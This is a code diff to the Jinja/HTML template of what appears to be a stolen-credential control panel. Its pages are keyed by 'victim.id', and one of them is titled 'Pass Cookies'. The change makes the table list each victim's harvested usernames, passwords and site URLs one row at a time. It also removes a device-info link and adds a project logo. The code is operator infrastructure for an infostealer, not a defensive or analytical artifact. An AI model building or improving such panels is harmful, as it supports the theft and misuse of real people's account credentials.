@@ -18,7 +18,6 @@
             </div>
             <div class="sidebar-nav">
                 <a class="nav-item" href="/overview?id={{ victim.id }}">Overview</a>
-                <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
                 <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
                 <a class="nav-item active" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
             </div>
@@ -42,15 +41,27 @@
                         </tr>
                     </thead>
                     <tbody>
+                        {% set urls = victim_data.url.split('\n') %}
+                        {% set usernames = victim_data.usernames.split('\n') %}
+                        {% set passwords = victim_data.passwords.split('\n') %}
+
+                        {% for i in range(urls|length) %}
                         <tr>
-                            <td>{{ victim_data.usernames }}</td>
-                            <td>{{ victim_data.passwords }}</td>
-                            <td><a href="{{ victim_data.url }}" target="_blank">{{ victim_data.url }}</a></td>
+                            <td>{{ usernames[i] }}</td>
+                            <td>{{ passwords[i] }}</td>
+                            <td><a href="{{ urls[i] }}" target="_blank">{{ urls[i] }}</a></td>
                         </tr>
+                        {% endfor %}
                     </tbody>
                 </table>
             </div>
         </main>
+    </div>
+
+    <div class="logo">
+                <img src="/static/image/Logo PBL.png" alt="FBL Logo">
+            </div>
+        </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
